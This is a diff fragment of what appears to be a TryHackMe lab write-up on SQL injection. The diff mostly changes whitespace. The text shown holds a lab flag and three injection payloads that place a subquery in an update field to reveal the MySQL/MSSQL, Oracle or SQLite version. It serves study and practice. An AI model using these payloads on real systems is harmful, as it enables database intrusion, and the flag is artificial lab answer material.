@@ -93,12 +93,15 @@ THM{727334fd0f0ea1b836a8d443f09dc8eb}|
 *To identify what database is in use...*
 
 ### For MySQL and MSSQL
+
 ',nickName=@@version,email='
 
-### For Oracle
+### For Oracle
+
 ',nickName=(SELECT banner FROM v$version),email='
 
-### For SQLite
+### For SQLite
+
 ',nickName=sqlite_version(),email='
 
 https://www.onlinehashcrack.com/wh86lv20ap
